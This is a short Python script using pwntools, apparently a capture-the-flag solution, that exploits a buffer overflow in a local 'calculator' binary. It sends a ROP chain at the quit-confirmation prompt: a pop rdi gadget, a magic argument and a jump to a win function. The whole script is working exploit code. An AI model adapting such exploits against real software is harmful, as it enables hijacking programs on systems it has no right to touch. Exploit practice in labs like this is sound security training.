from pwn import *
context.arch = "amd64"
#p = process('./calculator')

p = remote('127.0.0.1',39757)
pop_rdi = 0x40119a
win_arg = 0xC0FEBAB3
win_addr = 0x40119f

payloadtest = b'n' * 1 + b'a' * 3 + b'a' * 8 + p64(pop_rdi)+p64(win_arg) + p64(win_addr)

p.sendlineafter('Input :','q')

p.sendlineafter('Are you sure you want to leave? [Y/n]',payloadtest)

p.interactive()


